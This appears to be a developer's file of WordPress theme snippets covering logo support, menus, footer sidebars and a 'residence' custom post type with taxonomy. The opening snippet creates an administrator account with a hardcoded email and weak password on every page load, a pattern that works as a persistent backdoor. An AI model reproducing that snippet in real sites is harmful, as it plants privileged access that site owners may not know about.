------------------------------create user in WP-----------------------------
add_action( 'init', function () {				  
	// set username, password, and email address
  	$username = 'derek@weareigloo.com';
	$password = 'derek@123';
	$email_address = 'derek@weareigloo.com';

  	if ( ! username_exists( $username ) ) {
    	$user_id = wp_create_user( $username, $password, $email_address );
    	$user = new WP_User( $user_id );
      	$user->set_role( 'administrator' );
  	}

} );





<!--  -->




<?php 


//logo1 
add_theme_support( 'custom-logo' );
add_theme_support( 'post-thumbnails' );
//add_theme_support( 'automatic-feed-links' );
add_theme_support( 'custom-background' );
add_theme_support( 'title-tag' );
// logo 2
add_action('customize_register', 'transparent_logo_customize_register');

function transparent_logo_customize_register($wp_customize){
	$wp_customize->add_setting('transparent_logo');
$wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'transparent_logo', array(
    'label'    => __('Transparent Logo', 'store-front'),
    'section'  => 'title_tagline',
    'settings' => 'transparent_logo',
    'priority'       => 4,
)));
}
//menu registration
function register_my_menus() {
  register_nav_menus(
    array(
      'header-menu' => __( 'Header Menu' ),
      'footer-menu' => __( 'Footer Menu' ),
      'service-menu' => __( 'Service Menu' ),
      'specialties-menu' => __( 'Specialties Menu' )
     )
   );
 }
 add_action( 'init', 'register_my_menus' );


 register_sidebar( array(
'name' => 'Footer Sidebar 1',
'id' => 'footer-sidebar-1',
'description' => 'Appears in the footer area',
'before_widget' => '<aside id="%1$s" class="widget %2$s">',
'after_widget' => '</aside>',
'before_title' => '<h3 class="widget-title">',
'after_title' => '</h3>',
) );
register_sidebar( array(
'name' => 'Footer Sidebar 2',
'id' => 'footer-sidebar-2',
'description' => 'Appears in the footer area',
'before_widget' => '<aside id="%1$s" class="widget %2$s">',
'after_widget' => '</aside>',
'before_title' => '<h3 class="widget-title">',
'after_title' => '</h3>',
) );
register_sidebar( array(
'name' => 'Footer Sidebar 3',
'id' => 'footer-sidebar-3',
'description' => 'Appears in the footer area',
'before_widget' => '<aside id="%1$s" class="widget %2$s">',
'after_widget' => '</aside>',
'before_title' => '<h3 class="widget-title">',
'after_title' => '</h3>',
) );

 add_action( 'init', 'wpb_register_cpt_residence' );

function wpb_register_cpt_residence() {

$labels = array(
'name' => _x( 'Residence', 'residence' ),
'singular_name' => _x( 'residence', 'residence' ),
'add_new' => _x( 'Add New', 'residence' ),
'add_new_items' => _x( 'Add New residence', 'residence' ),
'edit_items' => _x( 'Edit residence', 'residence' ),
'new_items' => _x( 'New residence', 'residence' ),
'view_items' => _x( 'View residence', 'residence' ),
'search_items' => _x( 'Search residence', 'residence' ),
'not_found' => _x( 'No service found', 'residence' ),
'not_found_in_trash' => _x( 'No residence found in Trash', 'residence' ),
'parent_items_colon' => _x( 'Parent service:', 'residence' ),
'menu_name' => _x( 'Residence', 'residence' ),
);

$args = array(
'labels' => $labels,
'hierarchical' => false,
'supports' => array( 'title', 'thumbnail', 'editor' , 'editor', 'page-attributes' ),
'public' => true,
'show_ui' => true,
'show_in_menu' => true,
'show_in_nav_menus' => true,
'publicly_queryable' => true,
'exclude_from_search' => false,
'has_archive' => true,
'query_var' => true,
'can_export' => true,
'menu_icon' => 'dashicons-screenoptions',
'rewrite' => true,
'capability_type' => 'post'
    );
register_post_type( 'residence', $args );
flush_rewrite_rules();
}

function residence_tex() {
	register_taxonomy(
		'residence_tex',  //The name of the taxonomy. Name should be in slug form (must not contain capital letters or spaces).
		'residence',   		 //post type name
		array(
			'hierarchical' 		=> true,
			'label' 		=> 'Residence Category',  //Display name
			'query_var' 		=> true,
			'rewrite'		=> array(
			'slug' 			=> 'residence_tex', // This controls the base slug that will display before each term
			'hierarchical' => true,
			'with_front' 	=> false // Don't display the category base before
					)
			)
		);
}
add_action( 'init', 'residence_tex');

